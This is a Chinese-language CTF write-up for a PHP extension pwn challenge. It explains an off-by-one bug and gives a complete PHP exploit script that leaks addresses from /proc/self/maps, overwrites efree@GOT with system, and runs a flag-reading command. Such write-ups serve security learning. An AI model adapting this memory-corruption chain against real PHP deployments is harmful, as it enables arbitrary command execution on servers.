# Ezphp

## 题目简述

题目是 PHP 扩展层面的 pwn。扩展暴露了 `vh_add`、`vh_fast_add`、`vh_edit`、`vh_comment`、`vh_fast_delete` 等接口，核心漏洞是 off-by-one 导致编辑范围扩大，进而可以覆盖 `comment` 指针相关字段，把原本的对象操作转化为任意地址写。

利用思路是先通过 `/proc/self/maps` 泄露 libc 基址和扩展模块基址，再把扩展里的 `efree@GOT` 改成 `system`。随后把可控 chunk 内容改成 `/readflag > /var/www/html/flag`，触发释放时执行命令并把 flag 写到 Web 目录。

## 解题过程

一道很基础的php pwn  通过off-by-one 漏洞扩大edit的范围从而实现改掉comment的前8字节实现一个任意地址写
劫持efree_got为system就行了

exp

```
<?php
function str2Hex($str) {
    $hex = "";
    for ($i = strlen($str) - 1; $i >= 0; $i--) {
        $hex .= dechex(ord($str[$i]));
    }
    $hex = strtoupper($hex);
    return $hex;
}
function int2Str($i, $x = 8) {
    $re = "";
    for ($j = 0; $j < $x; $j++) {
        $re .= pack('C', $i & 0xff);
        $i >>= 8;
    }
    return $re;
}
function leakaddr($buffer) {
    global $libc, $mbase;
    $p = '/([0-9a-f]+)\-[0-9a-f]+ .* \/usr\/lib\/x86_64-linux-gnu\/libc.so.6/';
    $p1 = '/([0-9a-f]+)\-[0-9a-f]+ .* \/usr\/local\/lib\/php\/extensions\/no-debug-non-zts-20240924\/vuln.so/';
    preg_match_all($p, $buffer, $libc);
    preg_match_all($p1, $buffer, $mbase);
    return "";
}
$libc = "";
$mbase = "";
$cmd = "/readflag > /var/www/html/flag";
ob_start("leakaddr");
include("/proc/self/maps");
$buffer = ob_get_contents();
ob_end_flush();
leakaddr($buffer);
$libc_base = hexdec($libc[1][0]);
$mod_base = hexdec($mbase[1][0]);
$system_addr = $libc_base + 0x53110;
$_efree_got = $mod_base + 0x6070;
vh_fast_add(0x40); //0
vh_add(0x20); //1
vh_add(0x20); //2
vh_add(0x20); //3
vh_comment('gets');
vh_add(0x20); //4
vh_add(0x20); //5
vh_add(0x20); //6
vh_add(0x20); //7
vh_add(0x20); //8
$payload1 = 'aaaabaaacaaadaaaeaaafaaagaaahaaa' . int2Str(0x70);
vh_edit(2, $payload1);
$payload2 = 'aaaabaaacaaadaaaeaaafaaagaaahaaa' . int2Str($_efree_got);
vh_edit(3, $payload2);
vh_comment(int2Str($system_addr));
vh_fast_edit(0, $cmd);
vh_fast_delete(0);
?>
```

## 方法总结

PHP pwn 题如果能在 PHP 脚本层调用扩展函数，利用链通常是“脚本泄露地址 + 扩展内存破坏 + GOT/函数指针劫持”。本题的稳定点是 `/proc/self/maps` 可读，模块基址和 libc 基址都能从当前进程获得；off-by-one 只需要转化为覆盖指针字段，就能进一步改 GOT 并借释放流程调用 `system`。
